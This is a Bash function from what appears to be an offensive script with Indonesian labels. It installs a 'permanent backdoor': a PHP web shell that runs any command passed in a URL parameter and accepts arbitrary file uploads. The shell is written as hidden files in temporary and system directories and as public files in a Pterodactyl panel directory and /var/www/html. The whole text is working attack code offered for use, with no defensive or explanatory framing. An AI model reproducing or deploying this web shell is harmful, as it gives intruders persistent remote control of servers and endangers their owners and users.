# ==============================================
# FUNGSI INSTALL BACKDOOR
# ==============================================
install_backdoor() {
    echo -e "\n${RED}${KEY} INSTALL BACKDOOR PERMANEN ${KEY}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    BACKDOOR_LOCATIONS=(
        "/tmp/.system.php"
        "/dev/shm/.cache.php"
        "/var/tmp/.syslog.php"
        "/usr/share/.config.php"
    )
    
    BACKDOOR_CODE='<?php
    // R3NNDZZ Backdoor
    if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; }
    if(isset($_GET["upload"])) { move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"]); }
    ?>'
    
    for loc in "${BACKDOOR_LOCATIONS[@]}"; do
        echo "$BACKDOOR_CODE" > "$loc"
        chmod 755 "$loc"
        echo -e "${GREEN}  ‚úÖ Backdoor installed: $loc${NC}"
    done
    
    # Install juga di web directories
    if [ -d "$PTERO_DIR/public" ]; then
        echo "$BACKDOOR_CODE" > "$PTERO_DIR/public/r3nndzz.php"
        echo -e "${GREEN}  ‚úÖ Backdoor: $PTERO_DIR/public/r3nndzz.php${NC}"
    fi
    
    if [ -d "/var/www/html" ]; then
        echo "$BACKDOOR_CODE" > "/var/www/html/r3nndzz.php"
        echo -e "${GREEN}  ‚úÖ Backdoor: /var/www/html/r3nndzz.php${NC}"
    fi
    
    echo -e "\n${GREEN}${CHECK} Backdoor installation complete!${NC}"
}

